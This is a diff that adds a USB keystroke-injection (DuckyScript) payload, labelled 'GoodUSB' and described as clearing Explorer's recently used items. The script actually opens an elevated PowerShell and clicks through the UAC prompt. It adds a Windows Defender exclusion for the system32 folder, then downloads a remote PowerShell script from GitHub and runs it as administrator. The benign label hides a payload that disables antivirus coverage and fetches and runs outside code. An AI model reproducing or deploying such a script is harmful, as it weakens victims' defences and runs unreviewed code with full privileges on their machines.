@@ -1,0 +1,19 @@
+REM Author: UNC0V3R3D
+REM Description: Clear last used items in the explorer app.
+REM Version: 1.0
+REM Category: GoodUSB
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING New-Object System.Net.WebClient | %{$_.DownloadFile('https://github.com/UNC0V3R3D/ressources/blob/main/clear_last_used_items.ps1', 'script.ps1'); Start-Process powershell.exe -Verb runAs -ArgumentList "-File script.ps1"}, exit
+ENTER
